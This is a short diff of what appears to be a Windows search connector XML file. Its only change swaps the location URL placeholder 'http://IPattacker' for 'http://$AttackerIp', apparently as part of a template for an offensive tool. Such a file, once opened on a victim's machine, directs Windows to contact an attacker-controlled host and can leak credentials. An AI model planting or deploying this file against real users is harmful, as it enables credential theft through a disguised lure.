@@ -12,7 +12,7 @@
       <isDefaultSaveLocation>true</isDefaultSaveLocation>
       <isSupported>false</isSupported>
       <simpleLocation>
-        <url>http://IPattacker</url>
+        <url>http://$AttackerIp</url>
       </simpleLocation>
     </searchConnectorDescription>
   </searchConnectorDescriptionList>
